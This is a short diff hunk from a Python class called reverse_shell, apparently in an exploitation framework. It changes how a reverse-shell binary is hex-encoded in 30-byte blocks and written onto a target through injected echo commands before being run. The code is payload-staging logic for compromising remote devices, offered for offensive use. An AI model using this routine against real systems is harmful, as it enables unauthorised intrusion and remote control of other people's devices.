@@ -427,8 +427,8 @@ class reverse_shell(object):
             print_status("Transferring {}/{} bytes".format(current, len(self.revshell)))
 
             block = self.revshell[current:current + 30].encode('hex')
-            block = "\\x" + "\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
-            cmd = '$(echo -n -e "{}" >> {})'.format(block, path)
+            block = "\\\\x" + "\\\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
+            cmd = 'echo -ne "{}" >> {}'.format(block, path)
             self.exploit.execute(cmd)
 
         # execute binary
